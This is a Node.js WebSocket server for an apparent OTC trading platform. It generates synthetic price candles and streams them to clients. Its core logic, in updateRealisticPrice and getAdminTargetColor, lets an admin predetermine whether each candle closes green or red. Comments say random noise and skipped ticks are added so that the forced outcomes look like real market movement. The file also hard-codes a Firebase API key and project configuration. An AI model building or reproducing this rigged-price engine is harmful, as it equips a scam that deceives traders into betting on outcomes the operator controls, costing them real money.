// --- START: server.js (100% Fixed Admin Control Integration) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

// Firebase Configuration
const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 1000;
const TIMEFRAME = 60000;
const TICK_MS = 300;
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 300;

const markets = {}; // Server's internal market data
const adminPatterns = {}; // Local cache for admin patterns

// Helper functions
function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// --- Admin Control Listener ---
db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach(marketId => {
        if (fbMarkets[marketId]?.pattern_config?.isActive) {
            adminPatterns[marketId] = fbMarkets[marketId].pattern_config;
        } else {
            delete adminPatterns[marketId]; // Remove if not active
        }
    });
});

// Helper: Check if admin set a specific color for the current timeframe
function getAdminTargetColor(marketId, currentPeriod) {
    const adminPattern = adminPatterns[marketId];
    if (adminPattern && adminPattern.isActive && currentPeriod >= adminPattern.startTime) {
        const tfMs = (adminPattern.timeframe * 1000) || 60000;
        const patternIndex = Math.floor((currentPeriod - adminPattern.startTime) / tfMs);
        if (patternIndex >= 0 && patternIndex < adminPattern.pattern.length) {
            return adminPattern.pattern[patternIndex]; // 'GREEN' or 'RED'
        }
    }
    return null;
}

// Candle Generation Logic
function generateHistoricalCandle(timestamp, open) {
  const safeOpen = Math.max(MIN_PRICE, open);
  const isGreen = Math.random() > 0.5;
  const body = (0.00006 + Math.random() * 0.00025) * safeOpen;
  const close = isGreen ? safeOpen + body : safeOpen - body;
  const upperWick = (0.00003 + Math.random() * 0.00015) * safeOpen;
  const lowerWick = (0.00003 + Math.random() * 0.00015) * safeOpen;

  return {
    timestamp,
    open: roundPrice(safeOpen),
    high: roundPrice(Math.max(safeOpen, close) + upperWick),
    low: roundPrice(Math.min(safeOpen, close) - lowerWick),
    close: roundPrice(close)
  };
}

async function initializeNewMarket(marketId) {
  const path = marketPathFromId(marketId);
  let startPrice = 1.15;

  try {
    const liveSnap = await db.ref(`markets/${path}/live`).once('value');
    if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
  } catch (e) {}

  const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
  const candles = [];
  let currentPrice = startPrice;

  for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
    const c = generateHistoricalCandle(nowPeriod - (i * TIMEFRAME), currentPrice);
    candles.push(c);
    currentPrice = c.close;
  }

  markets[marketId] = {
    marketId,
    marketPath: path,
    history: candles,
    currentPrice: currentPrice,
    lastMove: 0
  };
}

function ensureCurrentPeriodCandle(marketData, currentPeriod) {
  let lastCandle = marketData.history[marketData.history.length - 1];
  if (!lastCandle) return null;

  if (currentPeriod > lastCandle.timestamp) {
    // Generate new candle for the new minute
    const newCandle = generateHistoricalCandle(currentPeriod, lastCandle.close);
    newCandle.close = newCandle.open;
    newCandle.high = newCandle.open;
    newCandle.low = newCandle.open;

    marketData.history.push(newCandle);
    if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
    
    // Update internal price tracker to match the new open price
    marketData.currentPrice = newCandle.open;
    return newCandle;
  }
  return lastCandle;
}

// 🔥 100% BULLETPROOF ADMIN ENFORCEMENT 🔥
function updateRealisticPrice(marketData, candle, targetColor) {
  if (Math.random() < 0.25) return; // Add realism by skipping some ticks

  const openPrice = candle.open;
  const baseVolatility = openPrice * 0.00005;

  let impulse = (Math.random() - 0.5) * baseVolatility * 2.5;
  let recoil = -marketData.lastMove * 0.3; 
  let jitter = (Math.random() - 0.5) * (baseVolatility * 0.2);
  let finalMove = impulse + recoil + jitter;
  
  if (Math.random() < 0.1) finalMove *= 3;

  let projectedPrice = marketData.currentPrice + finalMove;

  // 🔴🟢 ADMIN CONTROL STRICT RULES 🔴🟢
  if (targetColor === 'GREEN') {
      // MIN_SAFE_GAP ensures that even after toFixed(5) rounding, price NEVER equals open
      const MIN_SAFE_GAP = openPrice * 0.00005; 
      
      // If random calculation tries to pull the price down or make it equal to open, FORCE IT UP
      if (projectedPrice <= openPrice + MIN_SAFE_GAP) {
          projectedPrice = openPrice + MIN_SAFE_GAP + (Math.random() * baseVolatility * 2);
      }
  } else if (targetColor === 'RED') {
      const MIN_SAFE_GAP = openPrice * 0.00005; 
      
      // If random calculation tries to push the price up or make it equal to open, FORCE IT DOWN
      if (projectedPrice >= openPrice - MIN_SAFE_GAP) {
          projectedPrice = openPrice - MIN_SAFE_GAP - (Math.random() * baseVolatility * 2);
      }
  }

  // Apply the final enforced price
  marketData.currentPrice = projectedPrice;
  marketData.lastMove = projectedPrice - candle.close;

  candle.close = roundPrice(marketData.currentPrice);
  candle.high = roundPrice(Math.max(candle.high, candle.close, candle.open));
  candle.low = roundPrice(Math.min(candle.low, candle.close, candle.open));
}

function broadcastCandle(marketId, candle) {
  const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
  wss.clients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
      client.send(payload);
    }
  });
}

// Market listener
db.ref('admin/markets').on('value', (snapshot) => {
  const fbMarkets = snapshot.val() || {};
  Object.keys(fbMarkets).forEach((marketId) => {
    const type = fbMarkets[marketId]?.type;
    if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
      initializeNewMarket(marketId);
    }
  });
});

wss.on('connection', (ws) => {
  ws.on('message', (raw) => {
    try {
      const msg = JSON.parse(raw.toString());
      if (msg?.type === 'subscribe') {
        ws.subscribedMarket = msg.market;
        if (markets[msg.market]) {
            const historyPayload = { type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) };
            ws.send(JSON.stringify(historyPayload));
        }
      }
    } catch (_) {}
  });
});

// App endpoint to serve history for admin panel
app.get('/api/history/:marketId', (req, res) => {
    const marketId = req.params.marketId;
    if (markets[marketId] && markets[marketId].history) {
        res.json(markets[marketId].history);
    } else {
        res.status(404).json({ error: 'Market not found or not initialized' });
    }
});

// Main Loop
let lastSyncMinute = 0;
setInterval(() => {
  const now = Date.now();
  const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
  const currentMinute = Math.floor(now / 60000);

  for (const marketId in markets) {
    const marketData = markets[marketId];
    let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
    if (!candle) continue;

    // Check Admin Target Color before updating price
    const targetColor = getAdminTargetColor(marketId, currentPeriod);

    // Apply strict realistic update bounded by Admin constraints
    updateRealisticPrice(marketData, candle, targetColor);
    
    broadcastCandle(marketId, candle);
  }

  // Backup to Firebase every minute
  if (currentMinute > lastSyncMinute) {
    lastSyncMinute = currentMinute;
    const batchUpdates = {};
    for (const marketId in markets) {
      const m = markets[marketId];
      const lastC = m.history[m.history.length-1];
      if (lastC) {
        batchUpdates[`markets/${m.marketPath}/live`] = {
          price: lastC.close,
          timestamp: lastC.timestamp
        };
      }
    }
    db.ref().update(batchUpdates).catch(()=>{});
  }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('Admin Strict Enforced Socket Server Running'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));

// --- END OF FILE ---